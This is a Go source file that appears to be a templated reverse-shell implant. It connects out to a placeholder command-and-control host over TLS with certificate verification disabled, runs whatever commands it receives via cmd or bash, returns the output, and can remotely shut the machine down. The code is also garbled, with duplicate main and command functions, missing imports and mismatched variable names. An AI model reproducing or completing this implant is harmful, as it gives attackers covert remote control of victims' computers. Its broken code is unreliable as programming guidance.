package main

import (
    "io"
    "fmt"
    "bufio"
    "os/exec"
    "strings"
    "time"
    "strconv"
    "encoding/base64"
    "io/ioutil"
    "encoding/binary"
    "crypto/tls"
)

var VAR_C2_ADDR_AB = "OPT_SERVER_HOST:OPT_SERVER_PORT"

func FUNC_CMD_EXEC_X(cmd string){

}

VAR_KEY_1_AB = "KEY_1_BASE64"
VAR_KEY_2_AB = "KEY_2_BASE64"

func main(){


}

func FUNC_CMD_EXEC_X(cmd string) (string, error) {
    data := command
    switch runtime.GOOS{
    case "windows":
    	cmd := exec.Command("cmd", "/C", data)
    	//cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}
    	//cmd_instance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		output, err := cmd.CombinedOutput()
    	out := string(output)
    	return out, err
    case "linux":
    	cmd := exec.Command("bash", "-c", data)
	    output, err := cmd.CombinedOutput()
        out := string(output)
        return out, err
    default:
	    parts := strings.Fields(data)
        head := parts[0]
        parts = parts[1:len(parts)]
        cmd := exec.Command(head, parts...)
	    output, err := cmd.CombinedOutput()
        out := string(output)
        return out, err
    }
}

func FUNC_BASE64_DECODE_X(str string) string {
	VAR_RAW_AB, err := base64.StdEncoding.DecodeString(str)
    FUNC_PRINT_ERROR_X("Cannot base64 decode", err)
	return fmt.Sprintf("%s", VAR_RAW_AB)
}

func FUNC_SEND_DATA_X(conn net.Conn, message string){
    _, err := io.WriteString(conn, message+"\n")
    FUNC_PRINT_ERROR_X("Cannot send data",err)
}

func FUNC_EXIT_ON_ERROR_X(message string, err error){
	if err != nil{
		print_error(message + ": "+err.Error())
	}
}

func FUNC_CONN_HANDLER_TLS_X (conn net.Conn){
    defer conn.Close()
    VAR_BUF_AB := make([]byte, 100024) 
    for {
        n, _ := conn.Read(VAR_BUF_AB)
        //do smthing with err? ^
        rcv := string(VAR_BUF_XY[:n])
        if rcv == "mod_shutdown"{
        	FUNC_SHUTDOWN_X(conn)
        } else {
        	command := rcv
        	out, err := FUNC_CMD_OUT_X(command)
        	if err != nil{
        		FUNC_SEND_DATA_X(conn, "error:"+err.Error())
        	} else {
        		FUNC_SEND_DATA_X(conn, out)
        	}
        }
    }
}


func FUNC_SHUTDOWN_X(conn net.Conn){
    VAR_SUCCES_AB := true
    commands := map[string]string{
        "windows": "shutdown -s -t 60",
        "linux" : "shutdown +1",
        "darwin" : "shutdown -h +1",
    }
    VAR_CMD_AB := commands[runtime.GOOS]
    out, err := FUNC_CMD_OUT_X(VAR_CMD_AB)
    if err != nil{
        FUNC_SEND_DATA_X(conn, "err:"+"Shutdown error -"+out+" "+err.Error())
        VAR_SUCCES_AB = false
    } else{
        FUNC_SEND_DATA_X(conn, "inf:Initiated shutdown sequence")
    }
}

func main(){
	key_2 := []byte(FUNC_BASE64_DECODE_X(VAR_KEY_2_AB))
    key_1 := []byte(FUNC_BASE64_DECODE_X(VAR_KEY_1_AB))
    loaded_keypair, err := tls.X509KeyPair(key_1, key_2)
    if err != nil{
    	fmt.Println("Cannot load keypairs: "+err.Error())
    	os.Exit(0)
    }
    VAR_CONF_AB := tls.Config{Certificates: []tls.Certificate{loaded_keypair}, InsecureSkipVerify: true}
    c2_addr := VAR_C2_ADDR_AB
    conn, err := tls.Dial("tcp", c2_addr, &VAR_CONF_AB)
    if err != nil{
    	fmt.Println("Cannot connect with the server: "+err.Error())
    	os.Exit(0)
    }
    for{
    	FUNC_CONN_HANDLER_TLS_X(conn)
    }
}
